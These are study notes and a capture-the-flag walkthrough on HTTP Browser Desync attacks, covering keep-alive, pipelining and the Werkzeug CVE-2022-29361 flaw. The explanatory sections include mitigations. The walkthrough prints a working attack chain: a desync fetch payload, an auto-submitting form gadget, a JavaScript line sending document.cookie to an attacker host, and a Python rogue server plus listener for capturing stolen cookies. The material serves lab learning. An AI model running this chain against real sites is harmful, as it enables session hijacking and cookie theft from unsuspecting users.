# HTTP Browser Desync

- Attack Flow Recap
Initial POST request

Sent with a malicious payload containing an embedded GET request.

This payload is crafted to exploit parsing inconsistencies in the server’s request handling logic.

- Injected GET request

Although hidden inside the POST body, the vulnerable server interprets it as a standalone request.

This creates a desynchronization between the client’s intended request sequence and the server’s actual request queue.

- Next legitimate client request

The browser sends what it believes is a normal follow‑up request.

Due to the desync, the server processes the injected GET first, effectively hijacking the flow.

- Key Point
From the client perspective, only two requests are sent.

From the server perspective, three requests are processed:

The POST with the malicious body

The smuggled GET extracted from that body

The legitimate follow‑up request

- Security Impact
This discrepancy allows attackers to hijack sessions, bypass intended routing, or manipulate responses.

The desynchronized component is the HTTP request queue in the frontend server, which no longer aligns with the browser’s interpretation.

- In short: three HTTP requests are processed during a Browser Desync attack, because the server treats the injected payload as an additional request beyond what the client intended.

# HTTP Keep-Alive and Security Risks
- Definition:  
HTTP keep-alive allows multiple requests and responses to reuse a single TCP connection, reducing latency and improving performance by avoiding repeated connection setups.

- Benefit:
Lower overhead in establishing TCP handshakes.

Faster response times for clients.

More efficient resource usage on servers.

Security Risk – Cache Poisoning:

Persistent connections can be exploited if the server mismanages request boundaries.

Attackers may inject or smuggle malicious requests that are then cached.

This leads to cache poisoning, where malicious content is stored and served to other users.

The risk is amplified when combined with Browser Desync attacks, since desynchronized request parsing can cause unintended responses to be cached.

- Impact:
Users may receive attacker-controlled responses instead of legitimate content.

Session hijacking, credential theft, or malicious redirects can occur.

Exploitation requires only the frontend server to be vulnerable, making it easier to target.

- Mitigation Strategies:
Enforce strict request parsing rules (consistent Content-Length and Transfer-Encoding).

Disable ambiguous keep-alive behavior when not required.

Harden cache policies to prevent storage of unexpected or malformed responses.

Monitor for anomalies in request/response sequences.

- In short: HTTP keep-alive improves performance but introduces attack surface for cache poisoning when combined with request desynchronization vulnerabilities.

![alt text](<Captura de pantalla 2026-03-24 205536.png>)


# HTTP Pipelining and Security Implications
- Definition:  
HTTP pipelining allows a client to send multiple requests over a single TCP connection without waiting for each response before sending the next. This improves efficiency by reducing round‑trip delays.

- Normal Behavior:  
Typically, HTTP operates on a one request → one response model. With pipelining, multiple requests can be queued and processed sequentially.

- Differentiation of Requests:  
The Content-Length header is critical for distinguishing where one request ends and the next begins. It specifies the size of each request in bytes.

- Security Risk:
If the backend server does not properly enforce or validate Content-Length, it may misinterpret boundaries between requests.

This opens the door to request smuggling attacks, where an attacker injects malicious requests into the pipeline.

Static content (like images or icons) often lacks a Content-Length header, which can make servers more prone to misparsing.

The result can be desynchronization, cache poisoning, or hijacking of subsequent legitimate requests.

- Impact:
Attackers can manipulate how responses are delivered to clients.

Malicious payloads may be executed or cached, affecting multiple users.

This undermines trust in the integrity of the web application.

- Mitigation Strategies:
Enforce strict parsing of Content-Length and Transfer-Encoding.

Disable or limit HTTP pipelining if not required.

Apply robust input validation and request boundary checks.

Harden caching mechanisms to prevent poisoned responses from being stored.

- In short: HTTP pipelining improves efficiency but introduces attack surface for request smuggling when servers fail to correctly handle Content-Length boundaries.

![alt text](<Captura de pantalla 2026-03-24 205739.png>)

# HTTP Browser Desync
A Browser Desync attack is a specialized form of HTTP Request Smuggling that targets the way a frontend server and a web browser interpret HTTP request boundaries differently. Unlike traditional request smuggling, which often involves inconsistencies between frontend and backend servers, Browser Desync focuses on desynchronizing the browser-to-frontend connection.

- Attack Mechanics
Initial Crafted Request

The attacker sends a legitimate‑looking POST request.

Inside the body, they embed a malicious GET request.

If the server is vulnerable, it misparses the body and queues the embedded GET as a separate request.

- Desynchronization

The server’s request queue becomes misaligned with the browser’s intended sequence.

The browser believes it sent one request, but the server interprets two.

Next Legitimate Request

When the client sends another request, the server processes the injected GET first.

This hijacks the flow, potentially redirecting or poisoning the response.

- Security Impact
Account Hijacking: Attacker can intercept or replace legitimate requests.

Cache Poisoning: Malicious responses may be stored and served to other users.

- Session Manipulation: Exploits persistent connections (HTTP keep‑alive) to inject unauthorized actions.

- Broader Exploitation: Since only the frontend server needs to be vulnerable, the attack surface is wider than traditional request smuggling.

- Mitigation Strategies
Enforce strict parsing of Content-Length and Transfer-Encoding.

Disable ambiguous keep‑alive behaviors when not required.

Harden caching mechanisms to prevent storage of malformed responses.

Monitor for anomalies in request/response sequences.

- In summary: Browser Desync attacks desynchronize the HTTP request queue between the browser and the frontend server, allowing attackers to hijack or poison legitimate traffic.

![alt text](<Captura de pantalla 2026-03-24 210002.png>)

# High-Level Representation of a Browser Desync Attack
The attack unfolds in two distinct steps:

Initial Request Injection

The attacker sends a crafted request (commonly a POST) that appears legitimate.

Inside the body of this request, they embed an arbitrary request (e.g., a malicious GET).

If the server is vulnerable, it misinterprets the payload and places the embedded request into the connection queue.

This action desynchronizes the server’s request handling from the browser’s intended sequence.

Exploitation via Next Valid Request

The victim’s browser sends its next legitimate request.

Due to the desynchronization, the server processes the arbitrary injected request first, replacing the expected behavior.

This can lead to session hijacking, cache poisoning, or redirect manipulation depending on the payload.

- Key Technical Points
Component Desynchronized: The HTTP request queue in the frontend server.

- Mechanism Used: Persistent connections via HTTP keep‑alive allow multiple requests to share the same TCP session, making desync possible.

- Impact: The attacker gains control over how the server interprets subsequent requests, enabling account takeover or malicious content injection.

- In summary: A Browser Desync attack works by injecting a hidden request into a legitimate one, causing the server to misalign its request queue. The next valid request is replaced by the attacker’s payload, effectively hijacking the victim’s session.

![alt text](<Captura de pantalla 2026-03-24 210132.png>)

In the diagram above, the client initiates a POST request utilizing the keep-alive feature, ensuring the connection remains persistent. This persistence allows for transmitting multiple requests within the same session. This POST request contains a hijack GET request within its body. If the web server is vulnerable, it mishandles the request body, leaving this hijack request in the connection queue. Next, when the client makes another request, the hijack GET request is added at the forefront, replacing the expected behavior.

In this scenario, attempting to access the redirect page automatically will show the output from the 404 page instead of the redirect one.

# HTTP Browser Desync Identification (CVE-2022-29361)
Vulnerability Context

The vulnerable server is running Werkzeug v2.1.0, impacted by CVE-2022-29361.

The issue arises from how keep‑alive connections are handled when threaded or process options are enabled.

This allows attackers to exploit desynchronization between the browser and the frontend server.

Attack Mechanism

The attacker uses the fetch API in the browser to send a crafted POST request.

Payload example:
```javascript
fetch('http://MACHINE_IP:5000/', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',
});
```
- The POST request body contains a hidden GET request.

- If the server misparses this, the GET request is queued separately, desynchronizing the request stream.

1. Connection ID Role

The connection ID persists across requests due to keep‑alive.

This persistence allows the injected request to remain in the queue and hijack the next legitimate request.

In cross‑site scenarios, cookies may be exposed depending on the SameSite flag and CORS rules.

Since the domain matches, restrictions do not apply, making exploitation easier.

2. Observed Behavior

After injecting the payload, refreshing the page triggers a redirect to /redirect.

Because this route does not exist, the server returns a 404 error page.

This demonstrates that the injected request replaced the expected legitimate one.


## Example Outcomes
Client Perspective:

The browser sends what it believes are two requests (initial POST + next legitimate request).

Server Perspective:

The server processes three requests:

The POST with malicious body

The injected GET request (/redirect)

The legitimate follow‑up request

- Impact:

Session hijacking, cookie theft, or cache poisoning.

Complete control of the victim’s browser session if exploited in a real environment.

- In short: CVE-2022-29361 in Werkzeug v2.1.0 enables Browser Desync attacks by misparsing keep‑alive requests, allowing attackers to inject arbitrary requests into the server’s queue.

# HTTP Browser Desync Exploit Chaining with XSS
- Concept:  
Browser Desync can be chained with Cross-Site Scripting (XSS) to escalate impact. Instead of simply hijacking a redirect or causing a 404, the attacker injects a malicious payload that executes JavaScript in the victim’s browser.

- Attack Vector:

The attacker crafts a form gadget that leverages keep‑alive connections.

Example gadget:

```http
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```
The textarea overwrites bytes of the next request, redirecting traffic to the attacker’s rogue server.

The rogue server then serves a malicious payload, e.g.:
```javascript
fetch('http://YOUR_IP/' + document.cookie);
```
This exfiltrates the victim’s cookies.

- Why it Works:

Forms inherently support persistent connections (keep‑alive).

Using enctype="text/plain" avoids default MIME encoding, ensuring the malicious request is injected cleanly.

The desync positions the victim’s browser in a compromised connection context, so the next request retrieves the attacker’s payload.

Since the domain matches, SameSite cookie protections do not apply, allowing cookies to be stolen.

- Practical Example Flow
1. Victim visits a malicious page containing the crafted form.

2. The form auto‑submits, sending a POST with an embedded GET request.

3. The vulnerable server misparses and queues the injected GET.

4. The victim’s next request is replaced by the attacker’s GET, which points to the rogue server.

5. The rogue server responds with malicious JavaScript (e.g., cookie exfiltration).

6.Victim’s session tokens are stolen, enabling account hijacking.

- Impact
Session Hijacking: Cookies and tokens can be stolen.

Account Compromise: Attacker gains control over victim accounts.

Extended Exploitation: Can be chained with cache poisoning or CSRF for broader impact.

- In short: By chaining Browser Desync with XSS, attackers can escalate from simple request hijacking to full cookie theft and session takeover, using rogue servers and crafted form gadgets to deliver malicious payloads.

# Challenge Help Recap: Exploiting Browser Desync to Steal Cookies
You now have all the pieces to solve the challenge. Let’s break it down step‑by‑step with the practical payloads and server setup:

1. Configure Host Resolution
Add the vulnerable hostname to /etc/hosts:

```Bash
10.67.158.140 challenge.thm
```

This ensures the victim browser resolves challenge.thm correctly.

2️2. Confirm Vulnerability
Test with the desync payload:

```javascript
fetch('http://challenge.thm/', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',
})
```

Refreshing the page produces a 404 error, confirming the server is vulnerable to Browser Desync.

3. Identify Injection Point
The contact page (/securecontact) reflects input but does not interpret it.

The vulnerable contact page (/vulnerablecontact) interprets input, making it the ideal injection point for your malicious gadget.

4. Craft the Malicious Gadget
Embed the payload in the vulnerable contact form:

```html
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP:1337 HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```
enctype="text/plain" ensures raw injection.

The textarea overwrites the next request, redirecting the victim to your rogue server.

5. Rogue Server Setup
Create a Python exploit server (server.py) to deliver malicious JavaScript:

```python
#!/usr/bin/python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type","text/html")
            self.end_headers()
            self.wfile.write(b"fetch('http://YOUR_IP:8080/' + document.cookie)")

def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

- Run it:
```Bash
sudo python3 server.py
```

6. Cookie Exfiltration Endpoint
Start a second Python server to capture the stolen cookie:

```Bash
sudo python3 -m http.server 8080
```
When the victim’s browser executes the injected payload, it will send their cookies to your port 8080.

7. Profit – Capture the Flag
After ~1 minute, you should see a request like:

```Bash
GET /flag=THM{REDACTED} HTTP/1.1
```
This confirms successful session hijacking via Browser Desync + XSS chaining.

### Summary:

Add challenge.thm to /etc/hosts.

Verify desync with the fetch payload.

Inject the malicious gadget into /vulnerablecontact.

Serve rogue JavaScript via Python server on port 1337.

Capture stolen cookies with Python server on port 8080.

Retrieve the flag from the victim’s session.

